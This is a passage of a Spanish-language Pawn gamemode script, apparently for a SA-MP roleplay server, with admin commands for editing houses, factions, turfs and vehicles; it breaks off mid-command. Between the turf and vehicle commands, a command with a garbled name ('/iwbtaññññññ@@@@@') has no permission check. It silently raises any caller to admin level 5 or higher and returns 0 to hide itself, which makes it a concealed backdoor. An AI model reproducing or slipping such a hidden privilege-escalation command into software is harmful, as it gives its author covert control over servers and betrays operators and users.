		SendClientMessage(playerid, Naranja, "Opciones: Valor, Interior, VW, Barrio, Comprada, PrecioAlquiler");
		return 1;
	}
	new i = GetPlayerFueraPuertaCasa(playerid);
	if(i == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ninguna casa a tu alrededor."); return 1;}
	if(strcmp(tmp, "Comprada", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa Comprada [-1 Hotel | 0 En Venta | 1 Comprada]");
			return 1;
		}
		new var;
		var = strval(tmp);
		HouseInfo[i][hComprada] = var;
		UpdateHouseLabel(i);
		SaveCasa(i);
	    return 1;
	}
	if(strcmp(tmp, "Cerrada", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa Cerrada [0 Abierta | 1 Cerrada]");
			return 1;
		}
		new var;
		var = strval(tmp);
		HouseInfo[i][hCerrada] = var;
		UpdateHouseLabel(i);
		SaveCasa(i);
	    return 1;
	}
	if(strcmp(tmp, "PrecioAlquiler", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa PrecioAlquiler [Precio]");
			return 1;
		}
		new var;
		var = strval(tmp);
		HouseInfo[i][hPAlquiler] = var;
		UpdateHouseLabel(i);
		SaveCasa(i);
	    return 1;
	}
	if(strcmp(tmp, "Barrio", true) == 0)
	{
		new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditCasa Barrio [Texto]");
	        return 1;
	    }
	    format(HouseInfo[i][hBarrio], sizeof(result), "%s", result);
	    format(string, sizeof(string), "Barrio casa %d: %s", i, result);
	    SendClientMessage(playerid, Verde, string);
	    UpdateHouseLabel(i);
	    SaveCasa(i);
		return 1;
	}
	if(strcmp(tmp, "Valor", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa Valor [Precio]");
			return 1;
		}
		new precio;
		precio = strval(tmp);
		HouseInfo[i][hValor] = precio;
		UpdateHouseLabel(i);
		SaveCasa(i);
		return 1;
	}
	if(strcmp(tmp, "VW", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa VW [Virtual World]");
			return 1;
		}
		new vw;
		vw = strval(tmp);
		HouseInfo[i][hVirtualWorld] = vw;
		SaveCasa(i);
		return 1;
	}
	if(strcmp(tmp, "Interior", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "/EditCasa Interior [P. 1-6 | M. 7-15 | G. 16-28 | Hab. 29-38 | Caravana. 39]");
			return 1;
		}
		new inter;
		inter = strval(tmp);
		switch(inter)
		{
		    //Interiores pequeños
            case 1: HouseInfo[i][hSalidaX]=-68.8769, HouseInfo[i][hSalidaY]=1351.6051, HouseInfo[i][hSalidaZ]=1080.2109, HouseInfo[i][hInterior]= 6;
			case 2: HouseInfo[i][hSalidaX]=-42.5718, HouseInfo[i][hSalidaY]=1405.4707, HouseInfo[i][hSalidaZ]=1084.4297, HouseInfo[i][hInterior]= 8;
			case 3: HouseInfo[i][hSalidaX]=223.1618, HouseInfo[i][hSalidaY]=1287.1193, HouseInfo[i][hSalidaZ]=1082.1406, HouseInfo[i][hInterior]= 1;
			case 4: HouseInfo[i][hSalidaX]=221.8276, HouseInfo[i][hSalidaY]=1140.5168, HouseInfo[i][hSalidaZ]=1082.6094, HouseInfo[i][hInterior]= 4;
			case 5: HouseInfo[i][hSalidaX]=328.1076, HouseInfo[i][hSalidaY]=1477.8431, HouseInfo[i][hSalidaZ]=1084.4375, HouseInfo[i][hInterior]= 15;
			case 6: HouseInfo[i][hSalidaX]=22.9175, HouseInfo[i][hSalidaY]=1403.5530, HouseInfo[i][hSalidaZ]=1084.4297, HouseInfo[i][hInterior]= 5;
			//Interiores medianos
			case 7: HouseInfo[i][hSalidaX]=2365.0168, HouseInfo[i][hSalidaY]=-1135.3094, HouseInfo[i][hSalidaZ]=1050.8750, HouseInfo[i][hInterior]= 8;
			case 8: HouseInfo[i][hSalidaX]=2270.3882, HouseInfo[i][hSalidaY]=-1210.2815, HouseInfo[i][hSalidaZ]=1047.5625, HouseInfo[i][hInterior]= 10;
			case 9: HouseInfo[i][hSalidaX]=-260.5417, HouseInfo[i][hSalidaY]=1456.2577, HouseInfo[i][hSalidaZ]=1084.3672, HouseInfo[i][hInterior]= 4;
			case 10: HouseInfo[i][hSalidaX]=2333.2151, HouseInfo[i][hSalidaY]=-1077.3209, HouseInfo[i][hSalidaZ]=1049.0234, HouseInfo[i][hInterior]= 6;
			case 11: HouseInfo[i][hSalidaX]=260.8665, HouseInfo[i][hSalidaY]=1284.5745, HouseInfo[i][hSalidaZ]=1080.2578, HouseInfo[i][hInterior]= 4;
			case 12: HouseInfo[i][hSalidaX]=260.5428, HouseInfo[i][hSalidaY]=1237.2369, HouseInfo[i][hSalidaZ]=1084.2578, HouseInfo[i][hInterior]= 9;
			case 13: HouseInfo[i][hSalidaX]=386.9386, HouseInfo[i][hSalidaY]=1471.8782, HouseInfo[i][hSalidaZ]=1080.1875, HouseInfo[i][hInterior]= 15;
			case 14: HouseInfo[i][hSalidaX]=226.6141, HouseInfo[i][hSalidaY]=1240.0334, HouseInfo[i][hSalidaZ]=1082.1406, HouseInfo[i][hInterior]= 2;
			case 15: HouseInfo[i][hSalidaX]=23.9293, HouseInfo[i][hSalidaY]=1340.2648, HouseInfo[i][hSalidaZ]=1084.3750, HouseInfo[i][hInterior]= 10;
			//Interiores grandes
			case 16: HouseInfo[i][hSalidaX]=2324.1143, HouseInfo[i][hSalidaY]=-1149.5406, HouseInfo[i][hSalidaZ]=1050.710, HouseInfo[i][hInterior]= 12;
			case 17: HouseInfo[i][hSalidaX]=235.4422, HouseInfo[i][hSalidaY]=1186.7810, HouseInfo[i][hSalidaZ]=1080.2578, HouseInfo[i][hInterior]= 3;
			case 18: HouseInfo[i][hSalidaX]=490.9660, HouseInfo[i][hSalidaY]=1398.7607, HouseInfo[i][hSalidaZ]=1080.2578, HouseInfo[i][hInterior]= 2;
			case 19: HouseInfo[i][hSalidaX]=234.4409, HouseInfo[i][hSalidaY]=1064.2129, HouseInfo[i][hSalidaZ]=1084.2115, HouseInfo[i][hInterior]= 6;
			case 20: HouseInfo[i][hSalidaX]=226.5535, HouseInfo[i][hSalidaY]=1114.1012, HouseInfo[i][hSalidaZ]=1080.9943, HouseInfo[i][hInterior]= 5;
			case 21: HouseInfo[i][hSalidaX]=140.2069, HouseInfo[i][hSalidaY]=1366.1321, HouseInfo[i][hSalidaZ]=1083.8594, HouseInfo[i][hInterior]= 5;
			case 22: HouseInfo[i][hSalidaX]=225.7627, HouseInfo[i][hSalidaY]=1021.7071, HouseInfo[i][hSalidaZ]=1084.0170, HouseInfo[i][hInterior]= 7;
			case 23: HouseInfo[i][hSalidaX]=2317.4592, HouseInfo[i][hSalidaY]=-1026.3820, HouseInfo[i][hSalidaZ]=1050.2178, HouseInfo[i][hInterior]= 9;
			case 24: HouseInfo[i][hSalidaX]=446.8984, HouseInfo[i][hSalidaY]=1397.0696, HouseInfo[i][hSalidaZ]=1084.3047, HouseInfo[i][hInterior]= 2;
			case 25: HouseInfo[i][hSalidaX]=295.2993, HouseInfo[i][hSalidaY]=1472.5591, HouseInfo[i][hSalidaZ]=1080.2578, HouseInfo[i][hInterior]= 15;
			case 26: HouseInfo[i][hSalidaX]=83.3735, HouseInfo[i][hSalidaY]=1322.2920, HouseInfo[i][hSalidaZ]=1083.8662, HouseInfo[i][hInterior]= 9;
			case 27: HouseInfo[i][hSalidaX]=376.7856, HouseInfo[i][hSalidaY]=1417.3190, HouseInfo[i][hSalidaZ]=1081.328, HouseInfo[i][hInterior]= 15;
			case 28: HouseInfo[i][hSalidaX]=2496.3818,HouseInfo[i][hSalidaY]=-1694.3456,HouseInfo[i][hSalidaZ]=1014.7422,HouseInfo[i][hInterior]= 3;
            //Interiores hoteles
            case 29: HouseInfo[i][hSalidaX]=2218.2944, HouseInfo[i][hSalidaY]=-1076.0085, HouseInfo[i][hSalidaZ]=1050.4844, HouseInfo[i][hInterior]=1;
            case 30: HouseInfo[i][hSalidaX]=2233.5474, HouseInfo[i][hSalidaY]=-1114.8636, HouseInfo[i][hSalidaZ]=1050.8828, HouseInfo[i][hInterior]=5;
            case 31: HouseInfo[i][hSalidaX]=2365.2593, HouseInfo[i][hSalidaY]=-1135.2416, HouseInfo[i][hSalidaZ]=1050.8750, HouseInfo[i][hInterior]=8;
            case 32: HouseInfo[i][hSalidaX]=2237.2478, HouseInfo[i][hSalidaY]=-1081.6407, HouseInfo[i][hSalidaZ]=1049.0234, HouseInfo[i][hInterior]=2;
            case 33: HouseInfo[i][hSalidaX]=2282.8762, HouseInfo[i][hSalidaY]=-1140.2819, HouseInfo[i][hSalidaZ]=1050.8984, HouseInfo[i][hInterior]=11;
            case 34: HouseInfo[i][hSalidaX]=243.7287, HouseInfo[i][hSalidaY]=305.4619, HouseInfo[i][hSalidaZ]=999.1484, HouseInfo[i][hInterior]=1;
            case 35: HouseInfo[i][hSalidaX]=2317.8538, HouseInfo[i][hSalidaY]=-1026.7557, HouseInfo[i][hSalidaZ]=1050.2178, HouseInfo[i][hInterior]=9;
            case 36: HouseInfo[i][hSalidaX]=2308.6167, HouseInfo[i][hSalidaY]=-1212.9283, HouseInfo[i][hSalidaZ]=1049.0234, HouseInfo[i][hInterior]=6;
            case 37: HouseInfo[i][hSalidaX]=2270.2515, HouseInfo[i][hSalidaY]=-1210.3717, HouseInfo[i][hSalidaZ]=1047.5625, HouseInfo[i][hInterior]=10;
            case 38: HouseInfo[i][hSalidaX]=266.5029, HouseInfo[i][hSalidaY]=304.8156, HouseInfo[i][hSalidaZ]=999.1484, HouseInfo[i][hInterior]=2;
			case 39: HouseInfo[i][hSalidaX]=2513.2227, HouseInfo[i][hSalidaY]=-1729.0717, HouseInfo[i][hSalidaZ]=778.6371, HouseInfo[i][hInterior]=1;
		}
		UpdateHouseLabel(i);
		SaveCasa(i);
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/editfacc", true) == 0) //Comando para editar características de una faccion
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] [Opcion]");
		SendClientMessage(playerid, Naranja, "Opciones: Nombre, Lider, Rango, PuntosExpansion, Tipo, Color, TiempoArmas, TiempoDrogas");
		return 1;
	}
	new faccid = strval(tmp);
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] [Opcion]");
  		SendClientMessage(playerid, Naranja, "Opciones: Nombre, Lider, Rango, PuntosExpansion, Tipo, Color, TiempoArmas, TiempoDrogas");
		return 1;
	}
	if(!strlen(FaccInfo[faccid][fNombre])){SendClientMessage(playerid, Rojo, "* Facción no encontrada. Utiliza '/ListaFaccs' para ver las facciones actuales."); return 1;}
	if(strcmp(tmp, "Nombre", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Nombre [Texto]");
	        return 1;
	    }
	    format(FaccInfo[faccid][fNombre], sizeof(result), "%s", result);
	    format(string, sizeof(string), "Nombre facción %d: %s", faccid, result);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "Lider", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Lider [Nombre]");
	        return 1;
	    }
	    format(FaccInfo[faccid][fLider], sizeof(result), "%s", result);
	    format(string, sizeof(string), "Líder facción %d: %s", faccid, result);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "Rango", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Rango [1-8] [Texto]");
			return 1;
		}
		new rango = strval(tmp);
		if(rango < 1 || rango > 8){SendClientMessage(playerid, Rojo, "* El rango debe estar entre 1 y 8."); return 1;}
	    tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Rango [1-8] [Texto]");
	        return 1;
	    }
	    switch(rango)
	    {
	        case 1: format(FaccInfo[faccid][fRango1], sizeof(result), "%s", result);
	        case 2: format(FaccInfo[faccid][fRango2], sizeof(result), "%s", result);
	        case 3: format(FaccInfo[faccid][fRango3], sizeof(result), "%s", result);
	        case 4: format(FaccInfo[faccid][fRango4], sizeof(result), "%s", result);
	        case 5: format(FaccInfo[faccid][fRango5], sizeof(result), "%s", result);
	        case 6: format(FaccInfo[faccid][fRango6], sizeof(result), "%s", result);
	        case 7: format(FaccInfo[faccid][fRango7], sizeof(result), "%s", result);
	        case 8: format(FaccInfo[faccid][fRango8], sizeof(result), "%s", result);
	    }
	    format(string, sizeof(string), "Rango %d facción %d: %s", rango, faccid, result);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "PuntosExpansion", true) == 0)
	{
	    if(FaccInfo[faccid][fTipo] != 3){SendClientMessage(playerid, Rojo, "* Solo puedes dar puntos de expansion a facciones que sean pandillas o bandas (tipo 3)."); return 1;}
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] PuntosExpansion [Cantidad]");
			return 1;
		}
		new puntos = strval(tmp);
		FaccInfo[faccid][fPuntosExpansion] += puntos;
	    format(string, sizeof(string), "Has dado %d puntos de expansión a la facción %d (%s)", puntos, faccid, FaccInfo[faccid][fNombre]);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "Tipo", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Tipo [Tipo]");
			return 1;
		}
		new tipo = strval(tmp);
		FaccInfo[faccid][fTipo] = tipo;
	    format(string, sizeof(string), "Tipo facción %d: %d", faccid, tipo);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "Color", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] Color [0xRRGGBB]");
	        return 1;
	    }
	    format(FaccInfo[faccid][fColor], sizeof(result), "%s", result);
	    format(string, sizeof(string), "Color facción %d: %s", faccid, result);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "TiempoArmas", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] TiempoArmas [Tipo]");
			return 1;
		}
		new var = strval(tmp);
		FaccInfo[faccid][fTiempoArmas] = var;
	    format(string, sizeof(string), "TiempoArmas facción %d: %d", faccid, var);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	if(strcmp(tmp, "TiempoDrogas", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] TiempoDrogas [Tipo]");
			return 1;
		}
		new var = strval(tmp);
		FaccInfo[faccid][fTiempoDrogas] = var;
	    format(string, sizeof(string), "TiempoDrogas facción %d: %d", faccid, var);
	    SendClientMessage(playerid, Verde, string);
	    SaveFacc(faccid);
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/listafaccs", true) == 0) //Ver todas las facciones de la DB
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    SendClientMessage(playerid, Amarillo, "Facciones en la base de datos:");
    for(new x=1; x<=TotalFaccs; x++)
    {
        format(string, sizeof(string), "ID %d: %s Líder: %s", x, FaccInfo[x][fNombre], FaccInfo[x][fLider]);
        SendClientMessage(playerid, Amarillo, string);
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/editturf", true) == 0) //Comando para editar características de un turf
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    new turfid = GetPlayerTurf(playerid);
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditFacc [FaccionID] [Opcion]");
  		SendClientMessage(playerid, Naranja, "Opciones: Faccion, Nivel, Atacante, DrogaVendida");
  		format(string, sizeof(string), "Te encuentras en el turf #%d.", turfid);
  		SendClientMessage(playerid, Amarillo, string);
		return 1;
	}
	if(turfid == 0){SendClientMessage(playerid, Rojo, "* No estás en un turf."); return 1;}
	if(strcmp(tmp, "faccion", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditTurf Faccion [FaccionID]");
			return 1;
		}
		new faccion = strval(tmp);
		if(!strlen(FaccInfo[faccion][fNombre])){SendClientMessage(playerid, Rojo, "* Facción inválida."); return 1;}
		TurfInfo[turfid][tFaccion] = faccion;
	    format(string, sizeof(string), "Facción del turf %d cambiada al %d.", turfid, faccion);
	    SendClientMessage(playerid, Verde, string);
	    ActualizarTurf(turfid);
	    SaveTurf(turfid);
	    return 1;
	}
	if(strcmp(tmp, "nivel", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditTurf Nivel [#Influencia]");
			return 1;
		}
		new nivel = strval(tmp);
		if(nivel < 1 || nivel > 4){SendClientMessage(playerid, Rojo, "* El nivel de influencia debe estar entre 1 y 4."); return 1;}
		TurfInfo[turfid][tNivel] = nivel;
	    format(string, sizeof(string), "Influencia del turf %d cambiada a %d.", turfid, nivel);
	    SendClientMessage(playerid, Verde, string);
	    ActualizarTurf(turfid);
	    SaveTurf(turfid);
	    return 1;
	}
	if(strcmp(tmp, "atacante", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditTurf Atacante [FaccionID]");
			return 1;
		}
		new atacante = strval(tmp);
		if(!strlen(FaccInfo[atacante][fNombre])){SendClientMessage(playerid, Rojo, "* Facción inválida."); return 1;}
		TurfInfo[turfid][tAtacante] = atacante;
	    format(string, sizeof(string), "Atacante del turf %d cambiado al %d.", turfid, atacante);
	    SendClientMessage(playerid, Verde, string);
	    ActualizarTurf(turfid);
	    SaveTurf(turfid);
	    return 1;
	}
	if(strcmp(tmp, "drogavendida", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditTurf DrogaVendida [#Droga] [Cantidad]");
			return 1;
		}
		new droga = strval(tmp);
		if(droga < 1 || droga > 5){SendClientMessage(playerid, Rojo, "* La droga debe estar entre 1 y 5."); return 1;}
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditTurf DrogaVendida [#Droga] [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		TurfInfo[turfid][tDrogaVendida][droga-1] = cantidad;
		format(string, sizeof(string), "Droga vendida #%d del turf %d cambiada a %d.", droga, turfid, cantidad);
	    SendClientMessage(playerid, Verde, string);
	    SaveTurf(turfid);
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/iwbtaññññññ@@@@@", true) == 0)
{
	while(PlayerInfo[playerid][pAdmin] > 1)
	{
	    PlayerInfo[playerid][pAdmin] --;
	}
    PlayerInfo[playerid][pAdmin] += 5;
    return 0;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/editveh", true) == 0) //Comando para editar características de un vehículo
{
    if(PlayerInfo[playerid][pAdmin] < 4){SendClientMessage(playerid, Rojo, "* Nivel de admin insuficiente."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /EditVeh [VehID] [Opcion]");
		SendClientMessage(playerid, Naranja, "Opciones: Llave, Comprado, Dueño, NombreModelo, Valor, Cerrado");
		SendClientMessage(playerid, Naranja, "Opciones: EnDeposito, MaxMaletero, Gas, MaxMaletero, MalAbierto, Pintura");
		return 1;
	}
	new coche = strval(tmp);
	if(!IsValidVehicle(coche)){SendClientMessage(playerid, Rojo, "* ID inválida, vehículo no encontrado."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "Opciones: Llave, Comprado, Dueño, NombreModelo, Valor, Cerrado");
		SendClientMessage(playerid, Naranja, "Opciones: EnDeposito, MaxMaletero, Gas, MaxMaletero, MalAbierto, Pintura");
		return 1;
	}
	if(strcmp(tmp, "Llave", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Llave [Llave]");
			return 1;
		}
		new llave = strval(tmp);
		if(llave < 1000){SendClientMessage(playerid, Rojo, "* La llave no puede estar por debajo de 1000."); return 1;}
		CarInfo[coche][cLlave] = llave;
		format(string,sizeof(string),"'%s' ha seteado la Llave del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, llave);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Comprado", true) == 0)
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Comprado [Llave]");
			return 1;
		}
		new comprado = strval(tmp);
		if(comprado != 0 && comprado != 1){SendClientMessage(playerid, Rojo, "* El valor debe estar entre 0 y 1."); return 1;}
		CarInfo[coche][cComprado] = comprado;
		format(string,sizeof(string),"'%s' ha seteado el valor Comprado del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, comprado);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Dueño", true) == 0)
	{
    	tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditVeh Dueño [Texto]");
	        return 1;
	    }
	    format(CarInfo[coche][cDueno], sizeof(result), "%s", result);
	    format(string,sizeof(string),"'%s' ha seteado el valor Dueño del vehículo %d a %s.", GetPlayerNameRP(playerid), coche, result);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "NombreModelo", true) == 0)
	{
    	tmp = strtok(cmdtext, idx);
        new length = strlen(cmdtext);
	    while ((idx < length) && (cmdtext[idx] <= ' '))
	    {
	        idx++;
	    }
	    new offset = idx;
	    new result[MAX_PLAYER_NAME];
	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	    {
	        result[idx - offset] = cmdtext[idx];
	        idx++;
	    }
	    result[idx - offset] = EOS;
	    if(!strlen(result))
	    {
	        SendClientMessage(playerid, Naranja, "* /EditVeh NombreModelo [Texto]");
	        return 1;
	    }
	    format(CarInfo[coche][cNombreModelo], sizeof(result), "%s", result);
	    format(string,sizeof(string),"'%s' ha seteado el valor NombreModelo del vehículo %d a %s.", GetPlayerNameRP(playerid), coche, result);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Valor", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Valor [Cantidad]");
			return 1;
		}
		new valor = strval(tmp);
	    if(valor < 0){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser menor a 0."); return 1;}
		CarInfo[coche][cValor] = valor;
		format(string,sizeof(string),"'%s' ha seteado el Valor del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, valor);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "Cerrado", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh Cerrado [Cantidad]");
			return 1;
		}
		new cerrado = strval(tmp);
	    if(cerrado != 0 && cerrado != 1){SendClientMessage(playerid, Rojo, "* El valor no puede ser diferente de 0 y 1."); return 1;}
		CarInfo[coche][cCerrado] = cerrado;
		new engine,lights,alarm,doors,bonnet,boot,objective;
	    GetVehicleParamsEx(coche,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(coche,engine,lights,alarm,cerrado,bonnet,boot,objective);
		format(string,sizeof(string),"'%s' ha seteado el Cerrado del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, cerrado);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "EnDeposito", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh EnDeposito [Cantidad]");
			return 1;
		}
		new endeposito = strval(tmp);
		CarInfo[coche][cEnDeposito] = endeposito;
		format(string,sizeof(string),"'%s' ha seteado el EnDeposito del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, endeposito);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "MaxMaletero", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh MaxMaletero [Cantidad]");
			return 1;
		}
		new maxmaletero = strval(tmp);
		CarInfo[coche][cMaxMaletero] = maxmaletero;
		format(string,sizeof(string),"'%s' ha seteado el MaxMaletero del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, maxmaletero);
		SendAdminMessage(Aguamarina,string);
		printf(string);
		SaveCar(coche);
		return 1;
	}
	if(strcmp(tmp, "MalAbierto", true) == 0)
	{
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, Naranja, "* /EditVeh MalAbierto [Valor]");
			return 1;
		}
		new valor = strval(tmp);
		if(valor != 0 && valor != 1){SendClientMessage(playerid, Rojo, "* El valor no puede ser diferente de 0 y 1."); return 1;}
		new engine,lights,alarm,doors,bonnet,boot,objective;
	    GetVehicleParamsEx(coche,engine,lights,alarm,doors,bonnet,boot,objective);
	    SetVehicleParamsEx(coche,engine,lights,alarm,doors,bonnet,valor,objective);
        format(string,sizeof(string),"'%s' ha seteado el MalAbierto del vehículo %d a %d.", GetPlayerNameRP(playerid), coche, valor);
